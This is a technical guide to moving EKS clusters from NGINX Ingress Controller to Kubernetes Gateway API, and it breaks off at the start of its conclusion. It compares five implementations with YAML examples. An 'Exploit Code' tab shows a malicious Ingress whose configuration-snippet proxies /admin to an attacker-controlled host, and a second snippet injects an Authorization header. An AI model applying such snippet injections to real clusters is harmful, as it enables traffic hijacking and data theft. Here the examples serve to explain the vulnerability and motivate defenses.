---
title: "Gateway API Adoption Guide: From NGINX Ingress to Next-Generation Traffic Management"
sidebar_label: "1. Gateway API Adoption Guide"
description: "NGINX Ingress Controller EOL response, Gateway API architecture, GAMMA Initiative, AWS Native vs open-source comparison, Cilium ENI integration, migration strategy and benchmark planning"
tags: [eks, gateway-api, nginx, cilium, envoy, networking, migration, ebpf, gamma]
category: "performance-networking"
last_update:
  date: 2025-02-12
  author: devfloor9
sidebar_position: 1
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';
import GatewayApiBenefits from '@site/src/components/GatewayApiBenefits';
import {
  DocumentStructureTable,
  RiskAssessmentTable,
  ArchitectureComparisonTable,
  RoleSeparationTable,
  GaStatusTable,
  FeatureComparisonMatrix,
  SolutionOverviewMatrix,
  ScenarioRecommendationTable,
  FeatureMappingTable,
  DifficultyComparisonTable,
  AwsCostTable,
  OpenSourceCostTable,
  LatencyComparisonTable,
  RouteRecommendationTable,
  SolutionFeatureTable,
  RoadmapTimeline,
} from '@site/src/components/GatewayApiTables';

# Gateway API Adoption Guide

> **📌 Reference Versions**: Gateway API v1.4.0, Cilium v1.19.0, EKS 1.32, AWS LBC v3.0.0, Envoy Gateway v1.7.0

> 📅 **Published**: 2025-02-12 | ⏱️ **Reading Time**: Approximately 25 minutes

## 1. Overview

With the official End-of-Life (EOL) of NGINX Ingress Controller approaching in March 2026, transitioning to Kubernetes Gateway API has become a necessity rather than an option. This guide covers everything from understanding Gateway API architecture to comparing 5 major implementations (AWS LBC v3, Cilium, NGINX Gateway Fabric, Envoy Gateway, kGateway), deep-dive Cilium ENI mode configuration, step-by-step migration execution strategies, and performance benchmark planning.

### 1.1 Target Audience

- **EKS Cluster Administrators Operating NGINX Ingress Controller**: EOL response strategy development
- **Platform Engineers Planning Gateway API Migration**: Technology selection and PoC execution
- **Architects Evaluating Traffic Management Architecture Modernization**: Long-term roadmap design
- **Network Engineers Considering Cilium ENI Mode and Gateway API Integration**: eBPF-based high-performance networking

### 1.2 Document Structure

<DocumentStructureTable locale="en" />

:::info Reading Strategy
- **Quick Understanding**: Sections 1-3, 9 (approximately 10 minutes)
- **Technology Selection**: Sections 1-5, 9 (approximately 20 minutes)
- **Complete Migration**: Full document (approximately 25 minutes)
:::

---

## 2. NGINX Ingress Controller Retirement — Why Migration is Mandatory

### 2.1 EOL Timeline

```mermaid
gantt
    title NGINX Ingress Controller EOL and Migration Timeline
    dateFormat YYYY-MM
    axisFormat %Y-%m

    section Security Incidents
    IngressNightmare CVE-2025-1974 :milestone, cve, 2025-03, 0d

    section Official Announcements
    Retirement Discussion Acceleration :active, disc, 2025-03, 8M
    Official Retirement Announcement :milestone, retire, 2025-11, 0d
    Official EOL (Maintenance Discontinued) :crit, milestone, eol, 2026-03, 0d

    section Migration Phases
    Phase 1 Planning and PoC :plan, 2025-01, 6M
    Phase 2 Parallel Operation :parallel, 2025-07, 6M
    Phase 3 Transition Complete :switch, 2026-01, 3M
```

**Key Event Details:**

- **March 2025**: IngressNightmare (CVE-2025-1974) discovered — Arbitrary NGINX configuration injection vulnerability through Snippets annotations accelerated retirement discussions in Kubernetes SIG Network
- **November 2025**: Kubernetes SIG Network announces official retirement of NGINX Ingress Controller. Citing insufficient maintainer resources (1-2 core maintainers) and Gateway API maturity as primary reasons
- **March 2026**: Official EOL — Security patches and bug fixes completely discontinued. Continued use in production environments may result in compliance violations

:::danger Required Actions
**After March 2026, NGINX Ingress Controller will not receive security vulnerability patches.** To maintain security certifications such as PCI-DSS, SOC 2, and ISO 27001, you must transition to Gateway API-based solutions.
:::

### 2.2 Security Vulnerability Analysis

**IngressNightmare (CVE-2025-1974) Attack Scenario:**

<Tabs>
  <TabItem value="attack-overview" label="Attack Overview" default>

  ![IngressNightmare Attack Overview](/img/infrastructure-optimization/ingressnightmare-attack-overview.png)

  *Unauthenticated Remote Code Execution (RCE) attack vectors targeting Ingress NGINX Controller in a Kubernetes cluster. Both external and internal attackers can compromise the controller pod via Malicious Admission Review, gaining access to all pods in the cluster. (Source: [Wiz Research](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))*

  </TabItem>
  <TabItem value="architecture" label="Controller Architecture">

  ![Ingress NGINX Controller Internal Architecture](/img/infrastructure-optimization/ingress-nginx-controller-architecture.png)

  *Ingress NGINX Controller Pod internal architecture. The Admission Webhook's configuration validation process, where attackers inject malicious configurations into NGINX, is the core attack surface of CVE-2025-1974. (Source: [Wiz Research](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))*

  </TabItem>
  <TabItem value="exploit-code" label="Exploit Code">

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: malicious-ingress
  annotations:
    # Attacker injects arbitrary NGINX configuration
    nginx.ingress.kubernetes.io/configuration-snippet: |
      location /admin {
        proxy_pass http://malicious-backend.attacker.com;
        # Can bypass authentication, exfiltrate data, install backdoors
      }
spec:
  ingressClassName: nginx
  rules:
  - host: production-api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: production-service
            port:
              number: 80
```

  </TabItem>
</Tabs>

**Risk Assessment:**

<RiskAssessmentTable locale="en" />

:::warning If Currently Operating
For existing NGINX Ingress environments, we recommend immediately applying admission controller policies that prohibit the use of `nginx.ingress.kubernetes.io/configuration-snippet` and `nginx.ingress.kubernetes.io/server-snippet` annotations.
:::

### 2.3 Structural Resolution of Vulnerabilities through Gateway API Adoption

Gateway API fundamentally resolves the structural vulnerabilities of NGINX Ingress.

<ArchitectureComparisonTable locale="en" />

<Tabs>
<TabItem value="nginx" label="❌ NGINX Ingress Vulnerabilities" default>

**1. Configuration Snippet Injection Attack**

NGINX Ingress allows arbitrary string injection via annotations, creating severe security risks:

```mermaid
flowchart LR
    subgraph nginx["NGINX Ingress Attack Vector"]
        direction TB
        ann["annotations:<br/>configuration-snippet"]
        ann -->|"arbitrary string"| inject["Arbitrary NGINX config injection"]
        inject -->|"no validation"| danger["Security Risk<br/>(CVE-2021-25742)"]
    end

    style nginx fill:#ffebee,stroke:#c62828
    style danger fill:#ef5350,color:#fff
```

```yaml
# ❌ NGINX Ingress — arbitrary string injection possible
annotations:
  nginx.ingress.kubernetes.io/configuration-snippet: |
    # Adjacent service credential theft possible (CVE-2021-25742)
    proxy_set_header Authorization "stolen-token";
```

**2. All Permissions Concentrated in a Single Resource**

- Routing, TLS, security, and extension settings all mixed in one Ingress resource
- Per-annotation RBAC separation is impossible — full Ingress permission or none
- Developers who only need routing access also get TLS/security modification rights

**3. Vendor Annotation Dependency**

- Non-standard features added via vendor-specific annotations → **portability lost**
- Debugging annotation conflicts is difficult
- Growing complexity managing 100+ vendor annotations

These structural issues make NGINX Ingress unable to meet production security requirements.

</TabItem>
<TabItem value="gateway" label="✅ Gateway API Resolution">

**1. 3-Tier Role Separation Eliminates Snippets**

```mermaid
flowchart TB
    subgraph cluster["Gateway API 3-Tier Role Separation"]
        direction TB
        infra["Infrastructure Team<br/>(ClusterRole)"]
        platform["Platform Team<br/>(Role per NS)"]
        app["Application Team<br/>(Role per NS)"]

        infra -->|"manages"| gc["GatewayClass<br/>(cluster-scoped)"]
        platform -->|"manages"| gw["Gateway<br/>(namespace-scoped)"]
        app -->|"manages"| hr["HTTPRoute<br/>(namespace-scoped)"]
    end

    gc --> gw --> hr

    style infra fill:#e53935,color:#fff
    style platform fill:#fb8c00,color:#fff
    style app fill:#43a047,color:#fff
```

Each team manages resources only within their permission scope — arbitrary configuration injection paths are eliminated.

```yaml
# Infrastructure Team: GatewayClass (Cluster-level)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: infrastructure-team
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["gatewayclasses"]
  verbs: ["create", "update", "delete"]
---
# Platform Team: Gateway (Namespace-level)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: platform-team
  namespace: platform-system
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["gateways"]
  verbs: ["create", "update", "delete"]
---
# Application Team: HTTPRoute Only (Routing rules only)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-team
  namespace: app-namespace
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["httproutes"]
  verbs: ["create", "update", "delete"]
```

**2. CRD Schema-Based Structural Validation**

All fields are pre-defined with OpenAPI schemas, making arbitrary configuration injection fundamentally impossible:

```mermaid
flowchart LR
    subgraph gw["Gateway API Validation Flow"]
        direction TB
        crd["HTTPRoute CRD"]
        crd -->|"OpenAPI schema"| validate["Structural validation"]
        validate -->|"predefined fields only"| safe["Secure"]
    end

    style gw fill:#e8f5e9,stroke:#2e7d32
    style safe fill:#66bb6a,color:#fff
```

```yaml
# ✅ Gateway API — only schema-validated fields allowed
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /api
    filters:
    - type: RequestHeaderModifier  # Only predefined filters allowed
      requestHeaderModifier:
        add:
        - name: X-Custom-Header
          value: production
```

**3. Safe Extension via Policy Attachment Pattern**

Extension functionality is separated into Policy resources with RBAC control:

```mermaid
flowchart TB
    gw["Gateway"] --> hr["HTTPRoute"]
    hr --> svc["Service<br/>(app: api-gateway)"]

    policy["CiliumNetworkPolicy<br/>(separate Policy resource)"]
    policy -.->|"RBAC<br/>controlled"| svc

    subgraph policy_detail["Policy Content"]
        direction LR
        l7["L7 Security Policy"]
        rate["Rate Limiting<br/>(100 req/s)"]
        method["HTTP Method Restriction<br/>(GET /api/*)"]
    end

    policy --> policy_detail

    style policy fill:#ce93d8,stroke:#7b1fa2
    style policy_detail fill:#f3e5f5,stroke:#7b1fa2
```

```yaml
# Cilium's CiliumNetworkPolicy for L7 security policies
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-rate-limiting
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - fromEndpoints:
    - matchLabels:
        role: frontend
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/api/.*"
          rateLimit:
            requestsPerSecond: 100
```

</TabItem>
</Tabs>

:::info Active Community Support
- **15+ production implementations**: AWS, Google Cloud, Cilium, Envoy, NGINX, Istio, etc.
- **Regular quarterly releases**: Including GA resources as of v1.4.0
- **Official CNCF project**: Led by Kubernetes SIG Network
:::

---

## 3. Gateway API — Next-Generation Traffic Management Standard

### 3.1 Gateway API Architecture

![Gateway API Role-Based Model — Source: gateway-api.sigs.k8s.io](https://gateway-api.sigs.k8s.io/images/gateway-roles.png)

*Source: [Kubernetes Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/) — Three roles (Infrastructure Provider, Cluster Operator, Application Developer) managing GatewayClass, Gateway, and HTTPRoute respectively*

:::tip Detailed Comparison
For a detailed architecture comparison between NGINX Ingress and Gateway API, see [2.3 Structural Resolution of Vulnerabilities through Gateway API Adoption](#23-structural-resolution-of-vulnerabilities-through-gateway-api-adoption) with tabbed breakdowns.
:::

### 3.2 3-Tier Resource Model

Gateway API separates responsibilities with the following hierarchy:

<Tabs>
  <TabItem value="overview" label="Role Overview" default>

  ![Gateway API Resource Model — Source: gateway-api.sigs.k8s.io](https://gateway-api.sigs.k8s.io/images/resource-model.png)

  *Source: [Kubernetes Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/concepts/api-overview/) — GatewayClass → Gateway → xRoute → Service hierarchy*

  <RoleSeparationTable locale="en" />

  </TabItem>
  <TabItem value="infra" label="Infrastructure (GatewayClass)">

  **Infrastructure Team: GatewayClass-exclusive permissions (ClusterRole)**

  GatewayClass is a cluster-scoped resource that only the infrastructure team can create/modify. It controls controller selection and global policies.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: infrastructure-gateway-manager
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gatewayclasses"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  ```

  </TabItem>
  <TabItem value="platform" label="Platform (Gateway)">

  **Platform Team: Gateway management permissions (Role — namespace-scoped)**

  Gateway is a namespace-scoped resource. The platform team manages listener configuration, TLS certificates, and load balancer settings.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: platform-gateway-manager
    namespace: gateway-system
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gateways"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  - apiGroups: [""]
    resources: ["secrets"]  # TLS certificate management
    verbs: ["get", "list"]
  ```

  </TabItem>
  <TabItem value="app" label="App Team (HTTPRoute)">

  **Application Team: HTTPRoute only (Role — namespace-scoped)**

  Application teams manage only HTTPRoutes and ReferenceGrants in their own namespace. They cannot access GatewayClass or Gateway resources.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: app-route-manager
    namespace: production-app
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["httproutes", "referencegrants"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["get", "list"]
  ```

  </TabItem>
</Tabs>

### 3.3 GA Status (v1.4.0)

Gateway API is divided into Standard Channel and Experimental Channel, with varying maturity levels per resource:

<GaStatusTable locale="en" />

:::warning Experimental Channel Caution
Alpha-status resources have **no API compatibility guarantees**, with possible field changes or deletions during minor version upgrades. For production environments, we recommend using only GA/Beta resources from the Standard channel.
:::

### 3.4 Key Benefits

Explore the 6 key benefits of Gateway API through visual diagrams and YAML examples.

<GatewayApiBenefits />

## 4. GAMMA Initiative — The Future of Service Mesh Integration

Detailed content on GAMMA (Gateway API for Mesh Management and Administration) has been moved to a dedicated document.

:::tip Detailed Guide
See **[GAMMA Initiative — The Future of Service Mesh Integration](/docs/infrastructure-optimization/gateway-api-adoption-guide/gamma-initiative)** for:
- GAMMA overview and East-West traffic management
- Service mesh integration architecture
- Implementation support status by solution
:::

---

## 5. Gateway API Implementation Comparison - AWS Native vs Open Source

This section provides detailed comparisons of 5 major Gateway API implementations. Understanding the features, strengths, and weaknesses of each solution helps you make the optimal choice for your organization.

### 5.1 Solution Overview Comparison

The following matrix compares the key features, limitations, and use cases of 5 Gateway API implementations.

<SolutionOverviewMatrix locale="en" />

### 5.2 Comprehensive Comparison Table

<FeatureComparisonMatrix locale="en" />

### 5.3 NGINX Feature Mapping

Compare how 8 key NGINX Ingress Controller features are implemented across Gateway API solutions.

<FeatureMappingTable locale="en" />

**Legend**:
- ✅ Native support (no additional tools needed)
- ⚠️ Partial support or additional configuration required
- ❌ Not supported (separate solution needed)

### 5.4 Implementation Difficulty Comparison

<DifficultyComparisonTable locale="en" />

### 5.5 Cost Impact Analysis

#### AWS Native Additional Costs

<AwsCostTable locale="en" />

#### Open Source Additional Costs

<OpenSourceCostTable locale="en" />

:::tip Cost Optimization
If you need 3+ WAF features (IP Allowlist, Rate Limiting, Body Size), AWS Native is cost-effective. For 1-2 features, open source solutions can implement them for free.
:::

### 5.6 Feature Implementation Code Examples

Compare implementation approaches across solutions. Click tabs to view each solution's code.

#### 1. Authentication (Basic Auth Alternative)

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
# AWS LBC v3's native JWT validation
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: jwt-protected-route
  namespace: production
spec:
  parentRefs:
    - name: production-gateway
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api
      filters:
        - type: ExtensionRef
          extensionRef:
            group: eks.amazonaws.com
            kind: JWTAuthorizer
            name: cognito-authorizer
      backendRefs:
        - name: api-service
          port: 8080

---
# JWTAuthorizer CRD (LBC v3 extension)
apiVersion: eks.amazonaws.com/v1
kind: JWTAuthorizer
metadata:
  name: cognito-authorizer
spec:
  issuer: https://cognito-idp.us-west-2.amazonaws.com/us-west-2_ABC123
  audiences:
    - api-gateway-client
  claimsToHeaders:
    - claim: sub
      header: x-user-id
    - claim: email
      header: x-user-email
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium does not natively support JWT/OIDC authentication. Use CiliumEnvoyConfig to configure Envoy's ext_authz filter, or deploy a separate auth service (e.g., OAuth2 Proxy).
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

:::warning Limitation
NGINX Gateway Fabric does not support native JWT validation. Combine UpstreamSettingsPolicy with an external authentication service.
:::

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: SecurityPolicy
metadata:
  name: ext-auth
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  extAuth:
    http:
      service:
        name: auth-service
        port: 8080
        # auth-service returns HTTP 200 or 401
      headersToBackend:
        - x-user-id
        - x-user-role
      backendRefs:
        - name: auth-service
          port: 8080
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

```yaml
apiVersion: gateway.kgateway.io/v1alpha1
kind: RouteOption
metadata:
  name: jwt-auth
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  jwt:
    providers:
      - name: keycloak
        issuer: https://keycloak.example.com/auth/realms/production
        audiences:
          - api-gateway
        jwksUri: https://keycloak.example.com/auth/realms/production/protocol/openid-connect/certs
        claimsToHeaders:
          - claim: sub
            header: x-user-id
          - claim: groups
            header: x-user-groups
```

</TabItem>
</Tabs>

#### 2. Rate Limiting

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
# AWS Native uses AWS WAF for rate limiting
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    # Associate WAF Web ACL with rate-based rules
    alb.ingress.kubernetes.io/wafv2-acl-arn: arn:aws:wafv2:us-west-2:123456789012:regional/webacl/rate-limit-acl/a1b2c3d4
spec:
  gatewayClassName: aws-alb
  listeners:
  - name: http
    port: 80
    protocol: HTTP

---
# AWS WAF Rate-based Rule (created via AWS Console or CLI)
# Rule: Block IP if > 2000 requests in 5 minutes
```

</TabItem>
<TabItem value="cilium" label="Cilium">

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-rate-limit
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - toPorts:
    - ports:
      - port: "80"
      rules:
        http:
        - method: "GET"
          path: "/api/.*"
          rateLimit:
            requestsPerSecond: 100
            burst: 150
```

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: NginxProxy
metadata:
  name: rate-limiting-config
spec:
  rateLimiting:
    key: ${binary_remote_addr}
    zoneSize: 10m
    rate: 10r/s  # 10 requests per second per IP
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: BackendTrafficPolicy
metadata:
  name: rate-limit
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  rateLimit:
    type: Global
    global:
      rules:
        - limit:
            requests: 1000
            unit: Second
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

```yaml
apiVersion: gateway.kgateway.io/v1alpha1
kind: RouteOption
metadata:
  name: rate-limit
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  rateLimitConfigs:
    - actions:
        - genericKey:
            descriptorValue: api-rate-limit
      limits:
        - key: generic_key
          value: api-rate-limit
          requestsPerUnit: 1000
          unit: MINUTE
```

</TabItem>
</Tabs>

#### 3. IP Allowlist

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    # Associate WAF Web ACL
    alb.ingress.kubernetes.io/wafv2-acl-arn: arn:aws:wafv2:us-west-2:123456789012:regional/webacl/api-acl/a1b2c3d4
spec:
  gatewayClassName: aws-alb
  listeners:
  - name: http
    port: 80
    protocol: HTTP

---
# AWS WAF IP Set (created via AWS Console or CLI)
# IP allowlist: 203.0.113.0/24, 198.51.100.0/24
```

</TabItem>
<TabItem value="cilium" label="Cilium">

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: ip-allowlist
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - fromCIDR:
    - 203.0.113.0/24
    - 198.51.100.0/24
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
```

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: NginxProxy
metadata:
  name: ip-filtering
spec:
  ipFiltering:
    ipv4:
      - 203.0.113.0/24
      - 198.51.100.0/24
    mode: allow  # or deny for blocklist
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: SecurityPolicy
metadata:
  name: ip-allowlist
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: Gateway
      name: production-gateway
  authorization:
    rules:
      - action: ALLOW
        from:
          - source:
              cidr:
                - 203.0.113.0/24
                - 198.51.100.0/24
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

:::warning Limitation
kGateway implements IP filtering through Kubernetes NetworkPolicy or RouteOption with external authorization.
:::

</TabItem>
</Tabs>

#### 4. URL Rewrite

Standard Gateway API feature supported by all implementations.

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: url-rewrite
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /old-api
    filters:
    - type: URLRewrite
      urlRewrite:
        path:
          type: ReplacePrefixMatch
          replacePrefixMatch: /new-api
    backendRefs:
    - name: api-service
      port: 8080
```

#### 5. Request Body Size Limit

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
# AWS WAF Rule for body size limit
# Created via AWS Console or CLI
# Rule: Block requests with body size > 8KB
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium Gateway API does not provide a separate body size limit CRD. Configure via CiliumEnvoyConfig buffer filter or handle at the backend application level.
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: NginxProxy
metadata:
  name: body-size-limit
spec:
  clientMaxBodySize: 8m  # 8MB limit
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: ClientTrafficPolicy
metadata:
  name: body-size-limit
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: Gateway
      name: production-gateway
  http:
    maxRequestBodySize: 8388608  # 8MB in bytes
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

:::warning Limitation
kGateway does not directly support body size limits in RouteOption CRD. Implement via backend service or Envoy filter extensions.
:::

</TabItem>
</Tabs>

#### 6. Custom Error Pages

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: custom-error
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /maintenance
    filters:
    - type: ExtensionRef
      extensionRef:
        group: alb.networking.aws.com
        kind: FixedResponse
        name: maintenance-page
---
apiVersion: alb.networking.aws.com/v1
kind: FixedResponse
metadata:
  name: maintenance-page
spec:
  statusCode: 503
  contentType: text/html
  body: |
    <html>
      <body>
        <h1>Under Maintenance</h1>
        <p>We'll be back soon!</p>
      </body>
    </html>
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium Gateway API does not support native custom error pages. Deploy a separate error page service and route via HTTPRoute.
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

:::warning Limitation
NGINX Gateway Fabric handles custom errors through SnippetsPolicy or separate error service routing.
:::

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: custom-error
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /error
    filters:
    - type: ExtensionRef
      extensionRef:
        group: gateway.envoyproxy.io
        kind: DirectResponse
        name: error-response
---
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: DirectResponse
metadata:
  name: error-response
spec:
  statusCode: 503
  body: "Service temporarily unavailable"
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

:::warning Limitation
kGateway can configure custom responses using RouteOption transformation or faultInjection.
:::

</TabItem>
</Tabs>

#### 7. Header-Based Routing

Standard Gateway API feature supported by all implementations.

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: header-routing
spec:
  rules:
  # Route to beta backend for beta users
  - matches:
    - headers:
      - name: X-User-Type
        value: beta
    backendRefs:
    - name: beta-backend
      port: 8080

  # Route to production backend for others
  - backendRefs:
    - name: prod-backend
      port: 8080
```

#### 8. Session Affinity (Cookie-Based)

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    # Enable ALB stickiness
    alb.ingress.kubernetes.io/target-group-attributes: stickiness.enabled=true,stickiness.lb_cookie.duration_seconds=86400
spec:
  gatewayClassName: aws-alb
  listeners:
  - name: http
    port: 80
    protocol: HTTP
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium does not support native cookie-based session affinity. Configure Envoy's consistent hashing via CiliumEnvoyConfig.
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: UpstreamSettingsPolicy
metadata:
  name: session-affinity
spec:
  targetRef:
    group: ""
    kind: Service
    name: backend-service
  sessionAffinity:
    cookieName: BACKEND_SESSION
    cookieExpires: 1h
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: BackendTrafficPolicy
metadata:
  name: session-affinity
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  loadBalancer:
    type: ConsistentHash
    consistentHash:
      type: Cookie
      cookie:
        name: SESSION_COOKIE
        ttl: 3600s
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

```yaml
apiVersion: gateway.kgateway.io/v1alpha1
kind: RouteOption
metadata:
  name: session-affinity
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  sessionAffinity:
    cookieBased:
      cookie:
        name: SESSION_COOKIE
        ttl: 3600s
```

</TabItem>
</Tabs>

### 5.7 Route Selection Decision Tree

Use the following decision tree to select the optimal solution for your organization.

```mermaid
flowchart TD
    start([Start Migration]) --> q1{Is AWS service<br/>integration critical?}

    q1 -->|Yes| q2{Need minimal<br/>operational overhead?}
    q1 -->|No| q3{Planning<br/>service mesh?}

    q2 -->|Yes| aws["✅ AWS Native<br/>(LBC v3 + ALB)"]
    q2 -->|No| q4{Need high-performance<br/>eBPF?}

    q4 -->|Yes| cilium["✅ Cilium<br/>Gateway API"]
    q4 -->|No| aws

    q3 -->|Yes| q5{AI/ML workload<br/>routing needed?}
    q3 -->|No| q6{Leverage NGINX<br/>experience?}

    q5 -->|Yes| kgw["✅ kGateway<br/>(CNCF Sandbox)"]
    q5 -->|No| q7{Planning<br/>Istio?}

    q7 -->|Yes| envoy["✅ Envoy Gateway"]
    q7 -->|No| cilium

    q6 -->|Yes| nginx["✅ NGINX Gateway<br/>Fabric"]
    q6 -->|No| envoy

    style start fill:#f5f5f5,stroke:#333
    style aws fill:#e6ffe6,stroke:#009900
    style cilium fill:#e6f3ff,stroke:#0066cc
    style nginx fill:#fff0e6,stroke:#cc6600
    style envoy fill:#ffe6e6,stroke:#cc0000
    style kgw fill:#f0e6ff,stroke:#6600cc
```

### 5.8 Scenario-Based Recommendations

The following are recommended solutions based on common organizational scenarios.

<ScenarioRecommendationTable locale="en" />

---

## 6. Cilium ENI Mode + Gateway API Advanced Configuration

Detailed content on Cilium ENI mode and Gateway API advanced configuration has been moved to a dedicated document.

:::tip Detailed Guide
See **[Cilium ENI Mode + Gateway API Advanced Configuration Guide](/docs/infrastructure-optimization/gateway-api-adoption-guide/cilium-eni-gateway-api)** for:
- ENI mode architecture overview
- Prerequisites and installation
- Gateway API resource configuration
- Performance optimization (eBPF, XDP)
- Observability with Hubble
- BGP Control Plane v2
:::

---

## 7. Migration Execution Strategy

Detailed migration execution strategy has been moved to a separate document.

:::tip Detailed Guide
See **[Migration Execution Strategy](/docs/infrastructure-optimization/gateway-api-adoption-guide/migration-execution-strategy)** for:
- 5-Phase migration timeline
- Step-by-step execution guide
- Validation checklists
- Troubleshooting procedures
:::

---

## 8. Benchmark Comparison Planning

A systematic benchmark is planned for objective performance comparison of 5 Gateway API implementations. Eight scenarios including throughput, latency, TLS performance, L7 routing, scaling, resource efficiency, failure recovery, and gRPC will be measured in identical EKS environments.

:::info Detailed Benchmark Plan
For test environment design, detailed scenarios, measurement metrics, and execution plan, see **[Gateway API Implementation Performance Benchmark Plan](/docs/benchmarks/gateway-api-benchmark)**.
:::

---

## 9. Conclusion and Future Roadmap

### 9.1 Conclusion

<RouteRecommendationTable locale="en" />

Select the solution that best fits your organization based on the table above.

<Tabs>
<TabItem value="aws" label="AWS All-In" default>

